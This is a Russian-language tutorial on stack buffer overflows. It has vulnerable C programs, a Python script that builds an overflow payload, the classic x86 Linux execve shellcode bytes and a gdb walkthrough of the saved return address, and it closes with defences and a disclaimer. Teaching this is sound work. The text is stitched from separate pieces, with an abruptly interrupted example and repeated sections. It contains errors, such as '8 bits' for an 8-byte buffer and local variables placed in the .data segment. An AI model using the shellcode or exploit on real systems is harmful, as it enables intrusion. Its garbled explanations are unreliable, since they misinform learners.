Переполнение буфера (buffer overflow) — это ошибка программирования, при которой программа записывает больше данных в буфер, чем он может вместить, что может привести к переписыванию соседних областей памяти. Этот процесс часто используется злоумышленниками для выполнения произвольного кода, и вот основные этапы и механизмы, которые могут быть задействованы при переполнении буфера:

### 1. Идентификация уязвимого кода

Злоумышленник ищет уязвимости в коде, где данные, вводимые пользователем, обрабатываются недостаточно осторожно. Это могут быть функции, работающие со строками, массивами или другими типами данных с фиксированным размером.

Примеры функций на языке C, подверженных переполнению буфера:

- **strcpy()**
- **gets()**
- **scanf()** без указания ограничений длины строки

### 2. Создание эксплойта

После нахождения уязвимого кода злоумышленник создает специальный набор данных, который превышает размер буфера и позволяет записывать данные за его пределами.

Типичные элементы эксплойта:

- **Заголовок**: набор данных, заполняющий буфер до переполнения.
- **Перезаписываемые данные**: данные, которые перезапишут соседние области памяти, такие как адрес возврата.
- **Shellcode**: исполняемый код, который злоумышленник хочет внедрить.

### 3. Переполнение буфера

Злоумышленник вводит данные в программу (через пользовательский ввод, сетевой трафик и т. д.), превышающие размер буфера. Эти данные заполняют буфер и начинают переписывать соседние участки памяти.

### 4. Перезапись адреса возврата

Одной из основных целей является перезапись адреса возврата функции. Этот адрес указывает, куда программа должна вернуться после завершения текущей функции. Изменив его на адрес, содержащий внедренный код (shellcode), злоумышленник может перехватить управление программой.

### 5. Выполнение произвольного кода

Если переполнение буфера удалось, программа выполнит внедренный код, предоставив злоумышленнику контроль над системой. Это может привести к выполнению произвольных команд, краже данных и другим нежелательным последствиям.

### Пример переполнения буфера на языке C

Рассмотрим простой пример кода на C, подверженного переполнению буфера:
 
1) Переполнение буфера происходит, когда программа пытается записать слишком много данных в блок памяти фиксированной длины (буфер). Переполнение буфера может быть использовано злоумышленниками для сбоя веб-сервера или выполнения вредоносного кода.

2) Буфер-это блок непрерывной памяти, используемый для хранения данных. Языки высокого уровня будут проверять длину буфера перед записью в него, но языки низкого уровня, такие как C, C++ и Assembly, требуют, чтобы приложение само выполняло этот тип проверки.

3) Пример узвимого кода на C:

```c   
#include <stdio.h>
   
void askForUsername(){
 
   char buffer[8];
   printf("Enter supply your username:\n");
   scanf("%s", buffer);
   printf("You entered: %s\n", buffer);
   
}

int main(){
   while(1) askForUsername();

return 0;
}
```

   
Если мы попытаемся записать в блок памяти больше 8 бита то программа прекращает работу с ошибкой 

4) Дополнительные данные, которые переполняют буфер, будут записываться в соседнее пространство памяти и часто приводят к сбою приложения. При некоторых обстоятельствах злоумышленник сможет проникнуть своим собственным кодом в переполненные данные и выполнить этот “шеллкод” в уязвимом приложении.


Большинство языков, используемых для написания веб-кода, таких как Python, Ruby, Node, Java и .NET, используют “управляемую память” и невосприимчивы к атакам переполнения буфера.

Однако веб-серверы, языковые среды выполнения и операционные системы часто пишутся на языках низкого уровня и могут демонстрировать эту уязвимость. Тот факт, что 80% интернета работает на одном из четырех веб-серверов, означает, что в любой момент, когда обнаруживается уязвимость, она может быть широко использована!

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);
    printf("Input received: %s\n", buffer);
}

int main() {
    char input[100];
    printf("Enter your input: ");
    gets(input);
    vulnerable_function(input);
    return 0;
}
```

### Анализ примера

1. **Ввод данных**: Функция `gets()` считывает строку, введенную пользователем, без проверки длины.
2. **Копирование данных**: Функция `strcpy()` копирует введенные данные в буфер фиксированного размера 64 байта. Если введенные данные превышают этот размер, они начнут перезаписывать соседние области памяти.

### Пример атаки

Предположим, злоумышленник вводит строку длиной 100 байт. Поскольку буфер размером 64 байта не может вместить эти данные, последние 36 байт перезапишут соседние области памяти, потенциально включая адрес возврата функции.

### Меры защиты

Для защиты от переполнения буфера применяются следующие меры:

- **Использование безопасных функций**: Например, `strncpy()` вместо `strcpy()`.
- **Механизмы контроля переполнения**: Включение опций компилятора для обнаружения переполнений, таких как `-fstack-protector` в GCC.
- **Использование современных языков программирования**: Например, Python или Java, которые имеют встроенные механизмы защиты от переполнений.
- **Использование библиотек безопасности**: Например, AddressSanitizer (ASan).

Переполнение буфера остается одной из самых распространенных уязвимостей в программном обеспечении, и понимание его механизма важно для разработки более защищенных программ и систем.


Эксплуатация уязвимости переполнения буфера в данном примере кода требует подготовки, включающей написание и тестирование специализированного кода (эксплойта). Это включает в себя запись данных, превышающих размер буфера, и внедрение исполняемого кода. Давайте рассмотрим процесс эксплуатации данного примера пошагово:

### 1. Анализ кода

Рассмотрим еще раз код:

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Уязвимая функция
    printf("Input received: %s\n", buffer);
}

int main() {
    char input[100];
    printf("Enter your input: ");
    gets(input);  // Уязвимая функция
    vulnerable_function(input);
    return 0;
}
```

Здесь `buffer` размером 64 байта, а функция `strcpy` не проверяет длину входных данных, что делает код уязвимым к переполнению буфера.

### 2. Подготовка эксплойта

Наша цель — переполнить буфер и перезаписать адрес возврата, чтобы программа исполнила наш внедренный код.

#### Шаги:

1. **Заполнить буфер**: Нам нужно заполнить 64 байта буфера и продолжить запись, чтобы перезаписать адрес возврата.
2. **Перезаписать адрес возврата**: Переписываем адрес возврата функцией `vulnerable_function`, чтобы он указывал на наш исполняемый код.
3. **Внедрить shellcode**: Shellcode — это небольшой фрагмент кода, который мы хотим выполнить. Он должен находиться в памяти и быть исполнимым.

#### Пример эксплойта:

Мы подготовим строку, которая переполнит буфер и перезапишет адрес возврата.

### 3. Построение эксплойта

Для создания эксплойта мы используем Python для генерации строки, которая переполнит буфер и перезапишет адрес возврата.

```python
#!/usr/bin/python3

import struct

# 64 байта, чтобы заполнить буфер
buffer = b"A" * 64

# Дополнительные байты для перезаписи EBP (4 байта)
ebp_overwrite = b"B" * 4

# Новая адреса возврата: тут нужно поставить адрес на наш shellcode
# Предположим, что наш shellcode будет расположен по адресу 0xdeadbeef
new_return_address = struct.pack("<I", 0xdeadbeef)

# Собираем финальный эксплойт
exploit = buffer + ebp_overwrite + new_return_address

# Записываем в файл
with open("exploit.txt", "wb") as f:
    f.write(exploit)
```

Этот скрипт создает строку, которая будет заполнена символами `A` для переполнения буфера, затем перезаписывает EBP символами `B`, и в конце подставляет новый адрес возврата.

### 4. Запуск эксплойта

Мы используем скомпилированный файл и подаем созданный эксплойт в качестве входных данных.

```bash
./vulnerable_program < exploit.txt
```

### 5. Внедрение shellcode

Для успешного исполнения мы должны разместить shellcode в памяти и направить адрес возврата на него. В качестве примера простого shellcode, который открывает shell:

```c
// Пример shellcode для x86 Linux unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
```
### 6. Объединение и тестирование

Комбинируем буфер, адрес возврата и shellcode. В реальной системе это потребует:

- Нахождения точного адреса памяти для размещения shellcode.
- Корректировки значения `new_return_address` в эксплойте на адрес shellcode.


---

# Проникаем глубже 

### Уязвимый код

```c
#include <stdio.h>  
  
void call(){  
  
  char buffer[80];  
  printf("Enter: ");  
  scanf("%s", &buffer);  
  
}    
int main(){  
  
  
  call();  
  
  return 0;  
  
}
```

Так что тут у нас, видим у нас тут функция main() вызывает функцию call(). В фукции call() у нас buffer размером 80-байт. Сначало мы просим пользователя ввести данные, а после мы помещаем данные в buffer. Суть уязвимости переполнение буфера в том что переменная которая находиться в другом функции попадают в стек вместе с дополнительными данными,  а именно адрес возврата.  Если в buffer мы закинем машинный код, перепишем адрес возврата на начало адреса буффера, то код выполниться.

И так, переменные находятся в сегменте .data:

![[Pasted image 20221010044338.png]]

![[Pasted image 20221224122929.png]]

Если мы вызовем функцию, переменные вызываемой функции попадут в стек, вместе сними и другие данные (значение стековой канарейки и адрес возврата).

## Пошупайте

Давайте ка заполним буфер и посмотрим в память:

```bash
➜  c gdb a.out  
GNU gdb (Debian 10.1-2+b1) 10.1.90.20210103-git  
Copyright (C) 2021 Free Software Foundation, Inc.                                                                                            
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>  
This is free software: you are free to change and redistribute it.  
There is NO WARRANTY, to the extent permitted by law.  
Type "show copying" and "show warranty" for details.  
This GDB was configured as "x86_64-linux-gnu".  
Type "show configuration" for configuration details.  
For bug reporting instructions, please see:  
<https://www.gnu.org/software/gdb/bugs/>.  
Find the GDB manual and other documentation resources online at:  
   <http://www.gnu.org/software/gdb/documentation/>.  
  
For help, type "help".  
Type "apropos word" to search for commands related to "word"...  
  
warning: /home/s/pwndbg/gdbinit.py: No such file or directory  
Reading symbols from a.out...  
(gdb) l  
2  
3       void call(){  
4  
5               char buffer[80];  
6               printf("Enter: ");  
7               scanf("%s", &buffer);  
8  
9  
10      }  
11  
(gdb) b 8  
Breakpoint 1 at 0x1180: file main.c, line 10.  
(gdb) r  
Starting program: /home/s/Documents/projects/c/a.out    
BFD: /lib64/ld-linux-x86-64.so.2: unknown type [0x13] section `.relr.dyn'  
warning: `/lib64/ld-linux-x86-64.so.2': Shared library architecture unknown is not compatible with target architecture i386:x86-64.  
warning: `/lib64/ld-linux-x86-64.so.2': Shared library architecture unknown is not compatible with target architecture i386:x86-64.  
BFD: /lib/x86_64-linux-gnu/libc.so.6: unknown type [0x13] section `.relr.dyn'  
warning: `/lib/x86_64-linux-gnu/libc.so.6': Shared library architecture unknown is not compatible with target architecture i386:x86-64.  
Enter: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
  
Breakpoint 1, call () at main.c:10  
10      }  
(gdb) x/128bx buffer  
0x7fffffffdbf0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0x7fffffffdbf8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0x7fffffffdc00: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0x7fffffffdc08: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0x7fffffffdc10: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0x7fffffffdc18: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0x7fffffffdc20: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0x7fffffffdc28: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0x7fffffffdc30: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0x7fffffffdc38: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0x7fffffffdc40: 0x00    0xdc    0xff    0xff    0xff    0x7f    0x00    0x00  
0x7fffffffdc48: 0x95    0x51    0x55    0x55    0x55    0x55    0x00    0x00  
0x7fffffffdc50: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00  
0x7fffffffdc58: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00  
0x7fffffffdc60: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00  
0x7fffffffdc68: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00  
(gdb) i f  
Stack level 0, frame at 0x7fffffffdc50:  
rip = 0x555555555180 in call (main.c:10); saved rip = 0x555555555195  
called by frame at 0x7fffffffdc10  
source language c.  
Arglist at 0x7fffffffdc40, args:    
Locals at 0x7fffffffdc40, Previous frame's sp is 0x7fffffffdc50  
Saved registers:  
 rbp at 0x7fffffffdc40, rip at 0x7fffffffdc48
(gdb) x/g 0x7fffffffdc48  
0x7fffffffdc48: 0x0000555555555195  
(gdb)
```

  - **rip = 0x555555555180 in call (main.c:10); saved rip = 0x555555555195**  --> это значение регистра RIP, адрес инструкции которое должен дальше должен выполняться.
  
  - **rip at 0x7fffffffdc48** - Где находится сам этот адрес.

Ведь инструкции находятся в другом сегменте, а данные в другом.

Другими словами, по адресу  0x7fffffffdc48 находится память, значение которого адрес возврата, который записывается в регистр rip и программа продолжает своё выполнение с место которого была остановлена. Давайте ка посмотрим инструкции по адресу 0x555555555195:

```
(gdb) disassemble main  
Dump of assembler code for function main:  
  0x0000555555555183 <+0>:     push   %rbp  
  0x0000555555555184 <+1>:     mov    %rsp,%rbp  
  0x0000555555555187 <+4>:     sub    $0x20,%rsp  
  0x000055555555518b <+8>:     mov    $0x0,%eax  
  0x0000555555555190 <+13>:    call   0x555555555149 <call>  
  0x0000555555555195 <+18>:    movabs $0x4747474747474747,%rax          ************** Вот здесь  
  0x000055555555519f <+28>:    movabs $0x4747474747474747,%rdx  
  0x00005555555551a9 <+38>:    mov    %rax,-0x20(%rbp)  
  0x00005555555551ad <+42>:    mov    %rdx,-0x18(%rbp)  
  0x00005555555551b1 <+46>:    movw   $0x4747,-0x10(%rbp)  
  0x00005555555551b7 <+52>:    movb   $0x0,-0xe(%rbp)  
  0x00005555555551bb <+56>:    mov    $0x0,%eax  
  0x00005555555551c0 <+61>:    leave     
  0x00005555555551c1 <+62>:    ret
  ```

Вот как мы можно понять инстрцукции продолжают выполнение с того место где была остановлена, а точнее перед вызовом подпрограммы.

Когда вы ищите уязвимость в коде, когда смотрите на код, то представьте и ассемблер и как данные будут находится в стеке.


# Важное замечание

Эксплуатация таких уязвимостей на реальных системах без явного разрешения является незаконной и этически неприемлемой. Используйте подобные техники только в учебных целях и на системах, которые предназначены для тестирования.

# Заключение

Этот пример показывает, как можно использовать переполнение буфера для выполнения произвольного кода. В реальных условиях для успешной атаки могут потребоваться дополнительные шаги и настройки, такие как корректное определение адреса для shellcode и учет особенностей операционной системы и архитектуры процессора.